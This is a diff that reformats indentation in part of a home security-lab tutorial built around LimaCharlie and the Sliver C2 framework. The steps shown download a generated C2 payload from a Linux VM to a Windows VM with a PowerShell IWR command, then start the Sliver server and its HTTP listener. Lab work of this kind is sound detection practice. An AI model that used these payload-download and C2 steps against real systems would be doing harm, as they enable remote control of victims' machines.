@@ -213,7 +213,7 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
    Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP `[Linux_VM_IP]` and the name of the payload we generated in Sliver `[payload_name]` a few steps prior.
         
    ```
-        IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+   IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
    ```
         
 9. Now would be a good time to snapshot your Windows VM, before we execute the malware.
@@ -226,13 +226,13 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
     b. Now, relaunch Sliver
         
    ```
-        sliver-server
+   sliver-server
    ```
         
     c. Start the Sliver HTTP listener
         
    ```
-        http
+   http
    ```
         
     d. If you get an error starting the HTTP listener, try rebooting the Linux VM and retrying.
